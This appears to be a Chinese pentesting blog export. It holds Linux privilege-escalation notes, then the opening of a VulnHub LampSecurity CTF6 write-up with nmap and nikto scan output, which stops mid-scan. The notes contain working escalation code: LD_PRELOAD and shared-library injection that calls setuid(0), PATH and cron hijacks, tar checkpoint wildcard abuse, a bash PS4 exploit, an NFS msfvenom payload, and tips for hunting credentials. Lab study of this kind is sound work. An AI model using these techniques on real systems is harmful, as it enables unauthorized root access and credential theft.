&lt;sys/types.h&gt; //数据类型库#include &lt;stdlib.h&gt;void_init()&#123;    unsetenv(&quot;LD_PRELOAD&quot;); //执行一次就卸掉链接库    setgid(0);    setuid(0);    system(&quot;/bin/bash&quot;);    &#125;\n\n自动任务\n自动任务文件可写\ncat /etc/crontab\nls -la /etc | grep cron*\n\n环境变量路径可写且自动任务相对路径\n可写入crontab中$PATH变量中较前的路径。\n如果自动任务不是绝对路径，我们可以在较前的路径构造同名文件，实现劫持自动任务执行提权。\n#!/bin/bashcp /bin/bash /tmp/rootbashchmod +xs /tmp/rootbash\n\n自动任务通配符提权\n如果存在使用tar &lt;target&gt; *自动打包的自动任务\n我们可以通过--checkpoint-action利用\ntouch &lt;tar target&gt;/--checkpoint=1touch &lt;tar target&gt;/--checkpoint-action=exec=shell.elf\n\nSUIDfind / -type f -perm -u=s -ls 2&gt;/dev/null\n发现不常见的suid文件，我们可以使用strings查看其中字符串，strace以便后面利用。\n可执行文件直接gtfobins\n共享库注入提权so文件\n使用strings查看suid文件中可识别字符串发现使用到了so库文件\n使用strace追踪，使用2&gt;&amp;1将错误信息重定向到标准输出\n看他需要什么共享库，我们给他写一个\n/* lib.c /* gcc -fPIC -shared -o lib.so lib.c*/#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;static void inject() __attribute__((constructor));void inject()&#123;    setgid(0);    setuid(0);    system(&quot;/bin/bash -p&quot;);    &#125;\n\n环境变量利用用strings查看suid文件时时发现其中使用相对路径而非绝对路径。\n直接起一个一样的名字给他劫持掉。\n/* sameName.c /* gcc -o sameName sameName.c/* export PATH=.:$PATH*/#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;void main()&#123;    setgid(0);    setuid(0);    system(&quot;/bin/bash -p&quot;);    &#125;\n\nSUID-shell 功能提权\nbash --version小于4.2\nfunction /usr/sbin/service &#123; /bin/bash -p; &#125;export -f /usr/sbin/service //导出函数以劫持// 此处执行suid文件\n\nbash --version小于4.4\n# env 设置环境变量# -i 忽略现有的环境变量 # SHELLOPTS=xtrace用于命令执行前将其打印并插入其他语句# PS4 指定提示符env -i SHELLOPTS=xtrace PS4=&#x27;$(cp /bin/bash /tmp/rootbash;chmod +xs /tmp/rootbash)&#x27; &lt;any file set suid&gt;\n\n密码和密钥历史\n用history查看历史记录中是否遗留着密码\ncat ~/.*history | less用less列出当前用户家目录下所有与history相关的文件\n如果viminfo可以查看， 里面可能存在编辑时留下的密钥信息\n查看各种vpn配置文件(.ovpn)，网页配置文件(wp-config.php)等\n根目录下.ssh文件夹中可能存在私钥\n\nNFS提权NFS &#x3D; Network File System 常用于网络上文件共享。NFS即可用于获取初步立足点，也可用于提权。信息收集时要注意（一般绑在RPC端口上）。\n\ncat /etc/exports 查看NFS具体配置。如果有no_root_squash选项，很可能可以用于提权。\n\n在攻击机上挂载一下\nmkdir /tmp/nfsmount -o rw,vers=3 &lt;nfsip:/tmp&gt; /tmp/nfs #&lt;nfsip:/tmp&gt;在配置文件中得来cd /tmp/nfs su# 以root身份向其中插入我们的reverse shellmsfvenom -p linux/x86/exec CMD=&quot;/bin/bash -p&quot; -f elf -o /tmp/nfs/shell.elf\n\n在靶机中执行即可\n\n\n内核提权必须提一嘴，内核提权不太稳定，很容易搞崩机子，使用前要三思。此外，内核提权和抽奖挺像，要有耐心，选择有效的exp最关键。没有注释的exp慎用。\ndirtyCow不是很稳定。\nLinux Kernal 2.6有一个著名的内核提权漏洞UDEV。\ndoas less + vi提权\nfind / -perm -u=s -type f 2&gt;/dev/null\n在openBSD等一部分系统中，会用到doas作为特权操作，如果当前用户有操作doas的权限，可以考虑提权。\ncat /etc/doas.conf 查看不需要密码执行的doas操作。\n如果可以使用less，那我们在less中可以按v进入vi编辑模式以root权限进行文件操作。\n在vi模式中:!sh可以起一个新的shell，doas root则是root shell。\n\n利用MOTD机制提权 motd &#x3D; message of the day\n\ncd /etc/update-motd.d/ ; ls -la\ncat /etc/00-header\n如果可编辑则写入反弹shell或者其他提权语句都可。\n\n可预测PRNG暴力破解SSH提权prng &#x3D; pseudo random number generator\n如果拿到了ssh公钥，可以考虑使用伪随机数生成器暴力碰撞破解。\n可以在searchsploit中查找prng但是要注意openssl版本。\n下载下来公私钥库后 直接选择拿到公钥的一部分 grep -lr 递归列举文件搜索，找到对应的公私钥对。\n","categories":["Pentest"],"tags":["pe_notes"]},{"title":"[vulnhub]  LampSec-CTF6","url":"/2023/05/24/LampSecurity-CTF6_my/","content":"\n\n\n信息收集nmap主机发现\n┌──(kali㉿kali)-[~/vulnhub/LampSecurity/ctf6/workSpace]└─$ sudo nmap -sn 192.168.56.0/24         [sudo] password for kali: Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-28 11:02 CSTNmap scan report for 192.168.56.1Host is up (0.00020s latency).MAC Address: 00:50:56:C0:00:08 (VMware)Nmap scan report for 192.168.56.2Host is up (0.00023s latency).MAC Address: 00:50:56:EC:CE:9E (VMware)Nmap scan report for 192.168.56.140Host is up (0.00046s latency).MAC Address: 00:0C:29:5C:75:70 (VMware)Nmap scan report for 192.168.56.254Host is up (0.00021s latency).MAC Address: 00:50:56:FE:21:A5 (VMware)Nmap scan report for 192.168.56.132Host is up.Nmap done: 256 IP addresses (5 hosts up) scanned in 4.06 seconds\n端口扫描\n┌──(kali㉿kali)-[~/vulnhub/LampSecurity/ctf6/workSpace]└─$ sudo nmap -p- --min-rate=10000 192.168.56.140Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-28 11:03 CSTNmap scan report for 192.168.56.140Host is up (0.0026s latency).Not shown: 65525 closed tcp ports (reset)PORT     STATE SERVICE22/tcp   open  ssh80/tcp   open  http110/tcp  open  pop3111/tcp  open  rpcbind143/tcp  open  imap443/tcp  open  https624/tcp  open  cryptoadmin993/tcp  open  imaps995/tcp  open  pop3s3306/tcp open  mysqlMAC Address: 00:0C:29:5C:75:70 (VMware)Nmap done: 1 IP address (1 host up) scanned in 5.68 seconds\nUDP端口扫描\n┌──(kali㉿kali)-[~/vulnhub/LampSecurity/ctf6/workSpace]└─$ sudo nmap -sU -p- --min-rate=10000 192.168.56.140Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-28 11:06 CSTWarning: 192.168.56.140 giving up on port because retransmission cap hit (10).Stats: 0:00:37 elapsed; 0 hosts completed (1 up), 1 undergoing UDP ScanUDP Scan Timing: About 52.44% done; ETC: 11:08 (0:00:34 remaining)Nmap scan report for 192.168.56.140Host is up (0.0026s latency).Not shown: 65453 open|filtered udp ports (no-response), 81 closed udp ports (port-unreach)PORT    STATE SERVICE111/udp open  rpcbindMAC Address: 00:0C:29:5C:75:70 (VMware)Nmap done: 1 IP address (1 host up) scanned in 72.95 seconds\nTCP扫描，服务识别，OS识别\n┌──(kali㉿kali)-[~/vulnhub/LampSecurity/ctf6/workSpace]└─$ sudo nmap -sT -sV -O -p22,80,110,111,143,443,624,993,995,3306 192.168.56.140Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-28 11:08 CSTNmap scan report for 192.168.56.140Host is up (0.00049s latency).PORT     STATE SERVICE  VERSION22/tcp   open  ssh      OpenSSH 4.3 (protocol 2.0)80/tcp   open  http     Apache httpd 2.2.3 ((CentOS))110/tcp  open  pop3     Dovecot pop3d111/tcp  open  rpcbind  2 (RPC #100000)143/tcp  open  imap     Dovecot imapd443/tcp  open  ssl/http Apache httpd 2.2.3 ((CentOS))624/tcp  open  status   1 (RPC #100024)993/tcp  open  ssl/imap Dovecot imapd995/tcp  open  ssl/pop3 Dovecot pop3d3306/tcp open  mysql    MySQL 5.0.45MAC Address: 00:0C:29:5C:75:70 (VMware)Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed portDevice type: general purposeRunning: Linux 2.6.XOS CPE: cpe:/o:linux:linux_kernel:2.6OS details: Linux 2.6.9 - 2.6.30Network Distance: 1 hopOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 14.60 seconds\n可用信息很多。反正还是先从80看起吧。\n漏洞扫描\n┌──(kali㉿kali)-[~/vulnhub/LampSecurity/ctf6/workSpace]└─$ sudo nmap --script=vuln 192.168.56.140                                      Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-28 11:10 CSTNmap scan report for 192.168.56.140Host is up (0.0028s latency).Not shown: 991 closed tcp ports (reset)PORT     STATE SERVICE22/tcp   open  ssh80/tcp   open  http| http-enum: |   /mail/: Mail folder|   /logs/: Logs (401 Authorization Required)|   /phpmyadmin/: phpMyAdmin|   /css/: Potentially interesting directory w/ listing on &#x27;apache/2.2.3 (centos)&#x27;|   /docs/: Potentially interesting directory w/ listing on &#x27;apache/2.2.3 (centos)&#x27;|   /files/: Potentially interesting directory w/ listing on &#x27;apache/2.2.3 (centos)&#x27;|   /icons/: Potentially interesting directory w/ listing on &#x27;apache/2.2.3 (centos)&#x27;|   /inc/: Potentially interesting directory w/ listing on &#x27;apache/2.2.3 (centos)&#x27;|   /js/: Potentially interesting directory w/ listing on &#x27;apache/2.2.3 (centos)&#x27;|   /lib/: Potentially interesting directory w/ listing on &#x27;apache/2.2.3 (centos)&#x27;|   /manual/: Potentially interesting folder|   /sql/: Potentially interesting directory w/ listing on &#x27;apache/2.2.3 (centos)&#x27;|_  /templates/: Potentially interesting directory w/ listing on &#x27;apache/2.2.3 (centos)&#x27;| http-slowloris-check: |   VULNERABLE:|   Slowloris DOS attack|     State: LIKELY VULNERABLE|     IDs:  CVE:CVE-2007-6750|       Slowloris tries to keep many connections to the target web server open and hold|       them open as long as possible.  It accomplishes this by opening connections to|       the target web server and sending a partial request. By doing so, it starves|       the http server&#x27;s resources causing Denial Of Service.|       |     Disclosure date: 2009-09-17|     References:|       http://ha.ckers.org/slowloris/|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)| http-cookie-flags: |   /: |     PHPSESSID: |_      httponly flag not set|_http-dombased-xss: Couldn&#x27;t find any DOM based XSS.|_http-stored-xss: Couldn&#x27;t find any stored XSS vulnerabilities.| http-csrf: | Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.56.140|   Found the following possible CSRF vulnerabilities: |     |     Path: http://192.168.56.140:80/?action=login|     Form id: |     Form action: ?action=login|     |     Path: http://192.168.56.140:80/mail/|     Form id: rcmlogintz|_    Form action: ./|_http-trace: TRACE is enabled110/tcp  open  pop3| ssl-dh-params: |   VULNERABLE:|   Anonymous Diffie-Hellman Key Exchange MitM Vulnerability|     State: VULNERABLE|       Transport Layer Security (TLS) services that use anonymous|       Diffie-Hellman key exchange only provide protection against passive|       eavesdropping, and are vulnerable to active man-in-the-middle attacks|       which could completely compromise the confidentiality and integrity|       of any data exchanged over the resulting session.|     Check results:|       ANONYMOUS DH GROUP 1|             Cipher Suite: TLS_DH_anon_EXPORT_WITH_DES40_CBC_SHA|             Modulus Type: Safe prime|             Modulus Source: Unknown/Custom-generated|             Modulus Length: 512|             Generator Length: 8|             Public Key Length: 512|     References:|       https://www.ietf.org/rfc/rfc2246.txt|   |   Transport Layer Security (TLS) Protocol DHE_EXPORT Ciphers Downgrade MitM (Logjam)|     State: VULNERABLE|     IDs:  CVE:CVE-2015-4000  BID:74733|       The Transport Layer Security (TLS) protocol contains a flaw that is|       triggered when handling Diffie-Hellman key exchanges defined with|       the DHE_EXPORT cipher. This may allow a man-in-the-middle attacker|       to downgrade the security of a TLS session to 512-bit export-grade|       cryptography, which is significantly weaker, allowing the attacker|       to more easily break the encryption and monitor or tamper with|       the encrypted stream.|     Disclosure date: 2015-5-19|     Check results:|       EXPORT-GRADE DH GROUP 1|             Cipher Suite: TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA|             Modulus Type: Safe prime|             Modulus Source: Unknown/Custom-generated|             Modulus Length: 512|             Generator Length: 8|             Public Key Length: 512|     References:|       https://weakdh.org|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-4000|       https://www.securityfocus.com/bid/74733|   |   Diffie-Hellman Key Exchange Insufficient Group Strength|     State: VULNERABLE|       Transport Layer Security (TLS) services that use Diffie-Hellman groups|       of insufficient strength, especially those using one of a few commonly|       shared groups, may be susceptible to passive eavesdropping attacks.|     Check results:|       WEAK DH GROUP 1|             Cipher Suite: TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA|             Modulus Type: Safe prime|             Modulus Source: Unknown/Custom-generated|             Modulus Length: 1024|             Generator Length: 8|             Public Key Length: 1024|     References:|_      https://weakdh.org| ssl-ccs-injection: |   VULNERABLE:|   SSL/TLS MITM vulnerability (CCS Injection)|     State: VULNERABLE|     Risk factor: High|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h|       does not properly restrict processing of ChangeCipherSpec messages,|       which allows man-in-the-middle attackers to trigger use of a zero|       length master key in certain OpenSSL-to-OpenSSL communications, and|       consequently hijack sessions or obtain sensitive information, via|       a crafted TLS handshake, aka the &quot;CCS Injection&quot; vulnerability.|           |     References:|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224|       http://www.cvedetails.com/cve/2014-0224|_      http://www.openssl.org/news/secadv_20140605.txt|_sslv2-drown: ERROR: Script execution failed (use -d to debug)| ssl-poodle: |   VULNERABLE:|   SSL POODLE information leak|     State: VULNERABLE|     IDs:  CVE:CVE-2014-3566  BID:70574|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other|           products, uses nondeterministic CBC padding, which makes it easier|           for man-in-the-middle attackers to obtain cleartext data via a|           padding-oracle attack, aka the &quot;POODLE&quot; issue.|     Disclosure date: 2014-10-14|     Check results:|       TLS_RSA_WITH_AES_128_CBC_SHA|     References:|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566|       https://www.imperialviolet.org/2014/10/14/poodle.html|       https://www.openssl.org/~bodo/ssl-poodle.pdf|_      https://www.securityfocus.com/bid/70574111/tcp  open  rpcbind143/tcp  open  imap| ssl-ccs-injection: |   VULNERABLE:|   SSL/TLS MITM vulnerability (CCS Injection)|     State: VULNERABLE|     Risk factor: High|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h|       does not properly restrict processing of ChangeCipherSpec messages,|       which allows man-in-the-middle attackers to trigger use of a zero|       length master key in certain OpenSSL-to-OpenSSL communications, and|       consequently hijack sessions or obtain sensitive information, via|       a crafted TLS handshake, aka the &quot;CCS Injection&quot; vulnerability.|           |     References:|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224|       http://www.cvedetails.com/cve/2014-0224|_      http://www.openssl.org/news/secadv_20140605.txt|_sslv2-drown: ERROR: Script execution failed (use -d to debug)| ssl-dh-params: |   VULNERABLE:|   Anonymous Diffie-Hellman Key Exchange MitM Vulnerability|     State: VULNERABLE|       Transport Layer Security (TLS) services that use anonymous|       Diffie-Hellman key exchange only provide protection against passive|       eavesdropping, and are vulnerable to active man-in-the-middle attacks|       which could completely compromise the confidentiality and integrity|       of any data exchanged over the resulting session.|     Check results:|       ANONYMOUS DH GROUP 1|             Cipher Suite: TLS_DH_anon_EXPORT_WITH_DES40_CBC_SHA|             Modulus Type: Safe prime|             Modulus Source: Unknown/Custom-generated|             Modulus Length: 512|             Generator Length: 8|             Public Key Length: 512|     References:|       https://www.ietf.org/rfc/rfc2246.txt|   |   Transport Layer Security (TLS) Protocol DHE_EXPORT Ciphers Downgrade MitM (Logjam)|     State: VULNERABLE|     IDs:  CVE:CVE-2015-4000  BID:74733|       The Transport Layer Security (TLS) protocol contains a flaw that is|       triggered when handling Diffie-Hellman key exchanges defined with|       the DHE_EXPORT cipher. This may allow a man-in-the-middle attacker|       to downgrade the security of a TLS session to 512-bit export-grade|       cryptography, which is significantly weaker, allowing the attacker|       to more easily break the encryption and monitor or tamper with|       the encrypted stream.|     Disclosure date: 2015-5-19|     Check results:|       EXPORT-GRADE DH GROUP 1|             Cipher Suite: TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA|             Modulus Type: Safe prime|             Modulus Source: Unknown/Custom-generated|             Modulus Length: 512|             Generator Length: 8|             Public Key Length: 512|     References:|       https://weakdh.org|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-4000|       https://www.securityfocus.com/bid/74733|   |   Diffie-Hellman Key Exchange Insufficient Group Strength|     State: VULNERABLE|       Transport Layer Security (TLS) services that use Diffie-Hellman groups|       of insufficient strength, especially those using one of a few commonly|       shared groups, may be susceptible to passive eavesdropping attacks.|     Check results:|       WEAK DH GROUP 1|             Cipher Suite: TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA|             Modulus Type: Safe prime|             Modulus Source: Unknown/Custom-generated|             Modulus Length: 1024|             Generator Length: 8|             Public Key Length: 1024|     References:|_      https://weakdh.org| ssl-poodle: |   VULNERABLE:|   SSL POODLE information leak|     State: VULNERABLE|     IDs:  CVE:CVE-2014-3566  BID:70574|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other|           products, uses nondeterministic CBC padding, which makes it easier|           for man-in-the-middle attackers to obtain cleartext data via a|           padding-oracle attack, aka the &quot;POODLE&quot; issue.|     Disclosure date: 2014-10-14|     Check results:|       TLS_RSA_WITH_AES_128_CBC_SHA|     References:|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566|       https://www.imperialviolet.org/2014/10/14/poodle.html|       https://www.openssl.org/~bodo/ssl-poodle.pdf|_      https://www.securityfocus.com/bid/70574443/tcp  open  https| ssl-poodle: |   VULNERABLE:|   SSL POODLE information leak|     State: VULNERABLE|     IDs:  CVE:CVE-2014-3566  BID:70574|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other|           products, uses nondeterministic CBC padding, which makes it easier|           for man-in-the-middle attackers to obtain cleartext data via a|           padding-oracle attack, aka the &quot;POODLE&quot; issue.|     Disclosure date: 2014-10-14|     Check results:|       TLS_RSA_WITH_AES_128_CBC_SHA|     References:|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566|       https://www.imperialviolet.org/2014/10/14/poodle.html|       https://www.openssl.org/~bodo/ssl-poodle.pdf|_      https://www.securityfocus.com/bid/70574|_http-stored-xss: Couldn&#x27;t find any stored XSS vulnerabilities.| ssl-dh-params: |   VULNERABLE:|   Diffie-Hellman Key Exchange Insufficient Group Strength|     State: VULNERABLE|       Transport Layer Security (TLS) services that use Diffie-Hellman groups|       of insufficient strength, especially those using one of a few commonly|       shared groups, may be susceptible to passive eavesdropping attacks.|     Check results:|       WEAK DH GROUP 1|             Cipher Suite: TLS_DHE_RSA_WITH_DES_CBC_SHA|             Modulus Type: Safe prime|             Modulus Source: mod_ssl 2.2.x/1024-bit MODP group with safe prime modulus|             Modulus Length: 1024|             Generator Length: 8|             Public Key Length: 1024|     References:|_      https://weakdh.org|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)| ssl-ccs-injection: |   VULNERABLE:|   SSL/TLS MITM vulnerability (CCS Injection)|     State: VULNERABLE|     Risk factor: High|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h|       does not properly restrict processing of ChangeCipherSpec messages,|       which allows man-in-the-middle attackers to trigger use of a zero|       length master key in certain OpenSSL-to-OpenSSL communications, and|       consequently hijack sessions or obtain sensitive information, via|       a crafted TLS handshake, aka the &quot;CCS Injection&quot; vulnerability.|           |     References:|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224|       http://www.cvedetails.com/cve/2014-0224|_      http://www.openssl.org/news/secadv_20140605.txt|_http-dombased-xss: Couldn&#x27;t find any DOM based XSS.| http-csrf: | Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.56.140|   Found the following possible CSRF vulnerabilities: |     |     Path: https://192.168.56.140:443/mail/|     Form id: rcmlogintz|     Form action: ./|     |     Path: https://192.168.56.140:443/?action=login|     Form id: |     Form action: ?action=login|     |     Path: https://192.168.56.140:443/mail/?_task=mail|     Form id: rcmlogintz|_    Form action: ./| http-slowloris-check: |   VULNERABLE:|   Slowloris DOS attack|     State: LIKELY VULNERABLE|     IDs:  CVE:CVE-2007-6750|       Slowloris tries to keep many connections to the target web server open and hold|       them open as long as possible.  It accomplishes this by opening connections to|       the target web server and sending a partial request. By doing so, it starves|       the http server&#x27;s resources causing Denial Of Service.|       |     Disclosure date: 2009-09-17|     References:|       http://ha.ckers.org/slowloris/|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750| http-cookie-flags: |   /: |     PHPSESSID: |       secure flag not set and HTTPS in use|_      httponly flag not set|_http-trace: TRACE is enabled|_http-phpself-xss: ERROR: Script execution failed (use -d to debug)| http-enum: |   /mail/: Mail folder|   /logs/: Logs (401 Authorization Required)|   /phpmyadmin/: phpMyAdmin|   /css/: Potentially interesting directory w/ listing on &#x27;apache/2.2.3 (centos)&#x27;|   /docs/: Potentially interesting directory w/ listing on &#x27;apache/2.2.3 (centos)&#x27;|   /files/: Potentially interesting directory w/ listing on &#x27;apache/2.2.3 (centos)&#x27;|   /icons/: Potentially interesting directory w/ listing on &#x27;apache/2.2.3 (centos)&#x27;|   /inc/: Potentially interesting directory w/ listing on &#x27;apache/2.2.3 (centos)&#x27;|   /js/: Potentially interesting directory w/ listing on &#x27;apache/2.2.3 (centos)&#x27;|   /lib/: Potentially interesting directory w/ listing on &#x27;apache/2.2.3 (centos)&#x27;|   /manual/: Potentially interesting folder|   /sql/: Potentially interesting directory w/ listing on &#x27;apache/2.2.3 (centos)&#x27;|_  /templates/: Potentially interesting directory w/ listing on &#x27;apache/2.2.3 (centos)&#x27;993/tcp  open  imaps|_sslv2-drown: ERROR: Script execution failed (use -d to debug)| ssl-poodle: |   VULNERABLE:|   SSL POODLE information leak|     State: VULNERABLE|     IDs:  CVE:CVE-2014-3566  BID:70574|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other|           products, uses nondeterministic CBC padding, which makes it easier|           for man-in-the-middle attackers to obtain cleartext data via a|           padding-oracle attack, aka the &quot;POODLE&quot; issue.|     Disclosure date: 2014-10-14|     Check results:|       TLS_RSA_WITH_AES_128_CBC_SHA|     References:|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566|       https://www.imperialviolet.org/2014/10/14/poodle.html|       https://www.openssl.org/~bodo/ssl-poodle.pdf|_      https://www.securityfocus.com/bid/70574| ssl-dh-params: |   VULNERABLE:|   Anonymous Diffie-Hellman Key Exchange MitM Vulnerability|     State: VULNERABLE|       Transport Layer Security (TLS) services that use anonymous|       Diffie-Hellman key exchange only provide protection against passive|       eavesdropping, and are vulnerable to active man-in-the-middle attacks|       which could completely compromise the confidentiality and integrity|       of any data exchanged over the resulting session.|     Check results:|       ANONYMOUS DH GROUP 1|             Cipher Suite: TLS_DH_anon_EXPORT_WITH_DES40_CBC_SHA|             Modulus Type: Safe prime|             Modulus Source: Unknown/Custom-generated|             Modulus Length: 512|             Generator Length: 8|             Public Key Length: 512|     References:|       https://www.ietf.org/rfc/rfc2246.txt|   |   Transport Layer Security (TLS) Protocol DHE_EXPORT Ciphers Downgrade MitM (Logjam)|     State: VULNERABLE|     IDs:  CVE:CVE-2015-4000  BID:74733|       The Transport Layer Security (TLS) protocol contains a flaw that is|       triggered when handling Diffie-Hellman key exchanges defined with|       the DHE_EXPORT cipher. This may allow a man-in-the-middle attacker|       to downgrade the security of a TLS session to 512-bit export-grade|       cryptography, which is significantly weaker, allowing the attacker|       to more easily break the encryption and monitor or tamper with|       the encrypted stream.|     Disclosure date: 2015-5-19|     Check results:|       EXPORT-GRADE DH GROUP 1|             Cipher Suite: TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA|             Modulus Type: Safe prime|             Modulus Source: Unknown/Custom-generated|             Modulus Length: 512|             Generator Length: 8|             Public Key Length: 512|     References:|       https://weakdh.org|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-4000|       https://www.securityfocus.com/bid/74733|   |   Diffie-Hellman Key Exchange Insufficient Group Strength|     State: VULNERABLE|       Transport Layer Security (TLS) services that use Diffie-Hellman groups|       of insufficient strength, especially those using one of a few commonly|       shared groups, may be susceptible to passive eavesdropping attacks.|     Check results:|       WEAK DH GROUP 1|             Cipher Suite: TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA|             Modulus Type: Safe prime|             Modulus Source: Unknown/Custom-generated|             Modulus Length: 1024|             Generator Length: 8|             Public Key Length: 1024|     References:|_      https://weakdh.org| ssl-ccs-injection: |   VULNERABLE:|   SSL/TLS MITM vulnerability (CCS Injection)|     State: VULNERABLE|     Risk factor: High|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h|       does not properly restrict processing of ChangeCipherSpec messages,|       which allows man-in-the-middle attackers to trigger use of a zero|       length master key in certain OpenSSL-to-OpenSSL communications, and|       consequently hijack sessions or obtain sensitive information, via|       a crafted TLS handshake, aka the &quot;CCS Injection&quot; vulnerability.|           |     References:|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224|       http://www.cvedetails.com/cve/2014-0224|_      http://www.openssl.org/news/secadv_20140605.txt995/tcp  open  pop3s|_sslv2-drown: ERROR: Script execution failed (use -d to debug)| ssl-dh-params: |   VULNERABLE:|   Anonymous Diffie-Hellman Key Exchange MitM Vulnerability|     State: VULNERABLE|       Transport Layer Security (TLS) services that use anonymous|       Diffie-Hellman key exchange only provide protection against passive|       eavesdropping, and are vulnerable to active man-in-the-middle attacks|       which could completely compromise the confidentiality and integrity|       of any data exchanged over the resulting session.|     Check results:|       ANONYMOUS DH GROUP 1|             Cipher Suite: TLS_DH_anon_EXPORT_WITH_DES40_CBC_SHA|             Modulus Type: Safe prime|             Modulus Source: Unknown/Custom-generated|             Modulus Length: 512|             Generator Length: 8|             Public Key Length: 512|     References:|       https://www.ietf.org/rfc/rfc2246.txt|   |   Transport Layer Security (TLS) Protocol DHE_EXPORT Ciphers Downgrade MitM (Logjam)|     State: VULNERABLE|     IDs:  CVE:CVE-2015-4000  BID:74733|       The Transport Layer Security (TLS) protocol contains a flaw that is|       triggered when handling Diffie-Hellman key exchanges defined with|       the DHE_EXPORT cipher. This may allow a man-in-the-middle attacker|       to downgrade the security of a TLS session to 512-bit export-grade|       cryptography, which is significantly weaker, allowing the attacker|       to more easily break the encryption and monitor or tamper with|       the encrypted stream.|     Disclosure date: 2015-5-19|     Check results:|       EXPORT-GRADE DH GROUP 1|             Cipher Suite: TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA|             Modulus Type: Safe prime|             Modulus Source: Unknown/Custom-generated|             Modulus Length: 512|             Generator Length: 8|             Public Key Length: 512|     References:|       https://weakdh.org|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-4000|       https://www.securityfocus.com/bid/74733|   |   Diffie-Hellman Key Exchange Insufficient Group Strength|     State: VULNERABLE|       Transport Layer Security (TLS) services that use Diffie-Hellman groups|       of insufficient strength, especially those using one of a few commonly|       shared groups, may be susceptible to passive eavesdropping attacks.|     Check results:|       WEAK DH GROUP 1|             Cipher Suite: TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA|             Modulus Type: Safe prime|             Modulus Source: Unknown/Custom-generated|             Modulus Length: 1024|             Generator Length: 8|             Public Key Length: 1024|     References:|_      https://weakdh.org| ssl-poodle: |   VULNERABLE:|   SSL POODLE information leak|     State: VULNERABLE|     IDs:  CVE:CVE-2014-3566  BID:70574|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other|           products, uses nondeterministic CBC padding, which makes it easier|           for man-in-the-middle attackers to obtain cleartext data via a|           padding-oracle attack, aka the &quot;POODLE&quot; issue.|     Disclosure date: 2014-10-14|     Check results:|       TLS_RSA_WITH_AES_128_CBC_SHA|     References:|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566|       https://www.imperialviolet.org/2014/10/14/poodle.html|       https://www.openssl.org/~bodo/ssl-poodle.pdf|_      https://www.securityfocus.com/bid/70574| ssl-ccs-injection: |   VULNERABLE:|   SSL/TLS MITM vulnerability (CCS Injection)|     State: VULNERABLE|     Risk factor: High|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h|       does not properly restrict processing of ChangeCipherSpec messages,|       which allows man-in-the-middle attackers to trigger use of a zero|       length master key in certain OpenSSL-to-OpenSSL communications, and|       consequently hijack sessions or obtain sensitive information, via|       a crafted TLS handshake, aka the &quot;CCS Injection&quot; vulnerability.|           |     References:|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224|       http://www.cvedetails.com/cve/2014-0224|_      http://www.openssl.org/news/secadv_20140605.txt3306/tcp open  mysqlMAC Address: 00:0C:29:5C:75:70 (VMware)Nmap done: 1 IP address (1 host up) scanned in 167.11 seconds\n虽然很长一串，但是很多关于SSL漏洞的重复信息，且多是用于中间人攻击的，我们暂时用不上。\nnikto然后我们再用nikto扫一扫漏洞看看有没有什么遗漏的。\n┌──(kali㉿kali)-[~/vulnhub/LampSecurity/ctf6/workSpace]└─$ sudo nikto -h 192.168.56.140          - Nikto v2.5.0---------------------------------------------------------------------------+ Target IP:          192.168.56.140+ Target Hostname:    192.168.56.140+ Target Port:        80+ Start Time:         2023-04-28 11:16:09 (GMT8)---------------------------------------------------------------------------+ Server: Apache/2.2.3 (CentOS)+ /: Retrieved x-powered-by header: PHP/5.2.6.+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the 